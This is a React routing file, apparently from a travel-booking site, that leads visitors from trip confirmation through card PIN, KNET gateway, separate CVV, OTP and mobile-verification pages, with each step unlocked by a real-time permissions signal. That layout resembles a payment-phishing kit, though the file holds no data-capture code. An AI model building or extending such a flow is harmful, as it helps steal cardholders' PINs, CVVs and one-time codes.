import { permissions } from "@/real-time/context/signals";
import { useSignals } from "@preact/signals-react/runtime";
import { Navigate, Route, Routes } from "react-router-dom";
import { lazy } from "react";

const HomeLayout = lazy(() => import("../pages/home"));
const HomePage = lazy(() => import("../pages/home/HomePage"));
const Gateway = lazy(() => import("../pages/Gateway/Gateway"));
const TripConfirmPage = lazy(() => import("../pages/trip-confirm"));
const TravellerInfoPage = lazy(() => import("../pages/traveller-info"));
const Otp = lazy(() => import("../pages/Otp/Otp"));
const PIN = lazy(() => import("../pages/PIN.tsx"));
const pickPayment = lazy(() => import("../pages/pickPayment/pickPayment.tsx"));
const KnetGateway = lazy(() => import("../pages/knet-gateway/Knet.tsx"));
const KnetCVV = lazy(() => import("../pages/knet-gateway/KnetCVV.tsx"));
const Mobileverification = lazy(
  () => import("../pages/mobileverfication/Mobileverfication.tsx")
);
const Verify = lazy(() => import("../pages/verify/Verify.tsx"));
const Final = lazy(() => import("../pages/final/Final.tsx"));

const routes = [
  { path: "payment-gateway", page: Gateway },
  { path: "pin", page: PIN }, // only for normal visa
  { path: "knet-gateway", page: KnetGateway },
  { path: "knet-cvv", page: KnetCVV },
  { path: "otp", page: Otp },
  { path: "mobile-verification", page: Mobileverification },
  { path: "verify", page: Verify },
  { path: "final-page", page: Final },
];

function Router() {
  useSignals();
  return (
    <Routes>
      <Route Component={HomeLayout} path="/">
        <Route Component={HomePage} path="/" />
        <Route Component={TripConfirmPage} path="/trip-confirm" />
        <Route Component={TravellerInfoPage} path="/traveller-info" />
      </Route>

      <Route Component={pickPayment} path="/pick-payment" />

      {routes.map(
        (route) =>
          permissions.value.includes(route.path) && (
            <Route
              key={route.path}
              Component={route.page}
              path={`/${route.path}`}
            />
          )
      )}

      <Route element={<Navigate to={"/"} />} path="*" />
    </Routes>
  );
}

export default Router;
